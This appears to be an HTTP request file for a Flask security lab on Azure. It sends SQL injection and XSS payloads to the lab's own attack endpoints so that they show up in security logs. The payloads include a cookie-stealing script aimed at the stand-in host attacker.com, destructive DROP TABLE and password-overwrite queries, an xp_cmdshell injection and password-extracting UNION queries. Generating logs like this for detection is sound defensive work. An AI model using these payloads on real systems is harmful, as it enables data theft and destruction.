# Variables - Set your base URL here
@base_url = https://security-lab-93823-20250618.azurewebsites.net

### Testing Flask application for security logs generation

### 1. Application health check
GET {{base_url}}/api/health
Content-Type: application/json

### 2. Get security logs
GET {{base_url}}/api/logs
Content-Type: application/json

### 3. SQL Injection Attack Test
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "SELECT * FROM users WHERE id = 1 OR 1=1"
}

### 4. SQL Injection - Admin bypass attempt
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "SELECT * FROM users WHERE username = 'admin' OR '1'='1'"
}

### 5. SQL Injection - Database enumeration
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "SELECT table_name FROM information_schema.tables"
}

### 6. SQL Injection - Union attack
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "SELECT id FROM users UNION SELECT password FROM admin_table"
}

### 7. XSS Attack - Basic script injection
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "<script>alert('XSS Attack')</script>"
}

### 8. XSS Attack - Cookie theft simulation
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
}

### 9. XSS Attack - DOM manipulation
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "<img src=x onerror='document.body.innerHTML=\"<h1>Site Hacked</h1>\"'>"
}

### 10. XSS Attack - Event handler injection
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "\" onmouseover=\"alert('XSS')\""
}

### 11. Multiple SQL Injection attempts (brute-force simulation)
### Execute these quickly to simulate attack patterns

POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "'; DROP TABLE users; --"
}

###
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "admin'; UPDATE users SET password='hacked' WHERE role='admin'; --"
}

###
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "1' OR 1=1 LIMIT 1 OFFSET 1; --"
}

###
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "' UNION SELECT username, password FROM admin_users; --"
}

###
POST {{base_url}}/api/attack/sql
Content-Type: application/json

{
    "query": "1'; EXEC xp_cmdshell('dir'); --"
}

### 12. Multiple XSS attempts (different vectors)

POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "javascript:alert('XSS')"
}

###
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "<iframe src='javascript:alert(\"Iframe XSS\")'></iframe>"
}

###
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "<svg onload='alert(\"SVG XSS\")'></svg>"
}

###
POST {{base_url}}/api/attack/xss
Content-Type: application/json

{
    "payload": "<body onload='alert(\"Body XSS\")'>"
}

### 13. Check results after attacks
GET {{base_url}}/api/logs
Accept: application/json

### 14. Test non-existent endpoints (for 404 logs)
GET {{base_url}}/nonexistent
Accept: application/json

### 15. Test with malformed requests
POST {{base_url}}/api/attack/sql
Content-Type: application/json

### 16. Clear logs after testing
POST {{base_url}}/api/clear-logs
Content-Type: application/json

### Usage instructions:
### 1. The base_url is already set to your Azure deployment
### 2. Execute tests in order, or focus on specific attack types
### 3. Use sections 11-12 for rapid-fire attack simulation
### 4. Check logs with request #13 to see all generated security events
### 5. Use request #16 to clean up after testing
### 6. All requests generate logs visible in Azure Log Analytics